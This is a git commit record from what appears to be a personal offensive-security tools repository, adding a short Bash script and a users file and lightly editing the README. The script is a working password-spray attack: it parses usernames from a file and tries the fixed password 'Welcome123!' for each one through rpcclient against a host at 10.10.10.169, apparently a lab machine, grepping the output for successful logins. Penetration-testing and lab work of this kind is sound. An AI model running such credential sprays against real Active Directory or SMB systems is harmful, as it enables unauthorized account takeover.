d5db2ac07bdd933a800b111c1888128e64747524
Marcos Azevedo (psylinux) <psylinux@gmail.com>
2020-06-29 16:28:42 -0300

    Changes to be committed: 	new file:   AD/rpcclient-password-spray.sh 	new file:   AD/users 	modified:   README.md

---
+++ AD/rpcclient-password-spray.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+
+for u in $(cat users | awk -F@ '{print $1}' | awk -F: '{print $2}'); do
+    rpcclient -U "$u%Welcome123!" -c "getusername;quit" 10.10.10.169 | grep Authority;
+done
+
--- README.md
+++ README.md
@@ -1,3 +1,4 @@
 # My Security Tools
 
 Collection of scripts and other security tools that I use for offensive security tests.
+
